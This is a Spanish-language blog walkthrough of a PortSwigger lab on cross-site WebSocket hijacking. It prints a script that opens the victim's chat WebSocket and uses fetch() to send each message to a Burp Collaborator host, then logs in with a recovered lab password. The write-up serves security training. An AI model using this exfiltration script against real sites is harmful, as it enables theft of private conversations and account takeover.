---
title: "Cross-site WebSocket hijacking"
date: 2025-02-19 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - WebSockets
tags:
  - WebSockets
  - Cross-site WebSocket hijacking
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Para `resolver` este `laboratorio`, debemos `explotar` la funcionalidad de `WebSockets` para realizar un ataque de `Cross-Site WebSocket Hijacking`. Esto nos permitirá `interceptar` el `historial del chat` de la víctima y usar la información obtenida para `comprometer su cuenta`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/WebSockets-Lab-2/image_1.png)

Pulsamos sobre `Live chat` y vemos que hay un `chat` de `IA`. Este tipo de chats suelen ser `LLM's`, un tipo de `modelo de IA` entrenado con grandes volúmenes de texto para procesar y generar lenguaje natural. Estos modelos, como `ChatGPT`, son una subcategoría dentro del `NLP (Natural Language Processing)` y se especializan en tareas como `traducción`, `resumen`, `análisis de texto` y `generación de respuestas`

![](/assets/img/WebSockets-Lab-2/image_2.png)

Si nos `abrimos` el `inspector` de `Chrome` vemos que tenemos una `cookie` asignada

![](/assets/img/WebSockets-Lab-2/image_3.png)

Si accedemos a `Proxy > WebSockets history` podemos ver los `datos enviados` y `recibidos`, en el `primer mensaje` vemos el `handshake`, el `handshake` nos indica que ya estamos listos para poder `enviar mensajes`

![](/assets/img/WebSockets-Lab-2/image_4.png)

El `segundo mensaje` que obtenemos es al `conexión` del `otro usuario`

![](/assets/img/WebSockets-Lab-2/image_5.png)

`Enviamos` un `mensaje`

![](/assets/img/WebSockets-Lab-2/image_6.png)

Si nos vamos a `Burpsuite` podemos `ver` el `mensaje enviado`

![](/assets/img/WebSockets-Lab-2/image_7.png)

Si `inspeccionamos` el `código` vemos que se está usando `wss`, este es un `socket seguro`, el cual funciona sobre `HTTPS` y `cifra` las `comunicaciones` entre `cliente` y `servidor` mediante `TLS/SSL `

![](/assets/img/WebSockets-Lab-2/image_8.png)

Si nosotros `recargamos` la `web` con `F5` podemos ver como se `cargan todos los mensajes nuevamente` y se `restaura` el `chat` al `completo`. Podemos comprobar esto desde `Burpsuite`, `cada vez que recargamos la web se cargan todos los mensajes` y se vuelve a `establecer` la `conexión`

![](/assets/img/WebSockets-Lab-2/image_9.png)

Si `borramos` nuestra `cookie` y `refrescamos` la `página` se nos `asigna` una `nueva cookie` y un `nuevo chat`

![](/assets/img/WebSockets-Lab-2/image_10.png)

![](/assets/img/WebSockets-Lab-2/image_11.png)

Si `sustituimos` la `cookie` por la `anterior`, podemos volver a `recuperar` los `chats`

![](/assets/img/WebSockets-Lab-2/image_12.png)

Una vez validado esto, nos dirigimos a `Burpsuite Collaborator`, `pulsamos` en `Copy to clipboard`, `copiamos` la `dirección url` en el `script` y copiamos el `endpoint` del `chat` también para poder `establecer` una `conexión`. Una vez tenemos el `exploit` listo nos dirigimos al `Exploit server` y lo pegamos

```
<script>
    var ws = new WebSocket('wss://0a3500160349bd8c84a1ab7400a10009.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://efxlbue9fvngrpy1kw48884j3a91xrlg.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Cuando `pulsemos` sobre `Deliver exploit to victim` le `enviaremos` la `url` del `servidor` donde se `aloja` nuestro `exploit` y la víctima hará `click` sobre ella. Cuando eso ocurra, `obtendremos` sus `chats` en nuestro `subdominio` de `Burpsuite Collaborator`, en uno de esos `chats` podemos ver la `contraseña` del usuario `carlos`

![](/assets/img/WebSockets-Lab-2/image_13.png)

Pulsamos sobre `My account` e `iniciamos sesión` con las credenciales `carlos:no5jm5dbv3e89jna369b`

![](/assets/img/WebSockets-Lab-2/image_14.png)

![](/assets/img/WebSockets-Lab-2/image_15.png)
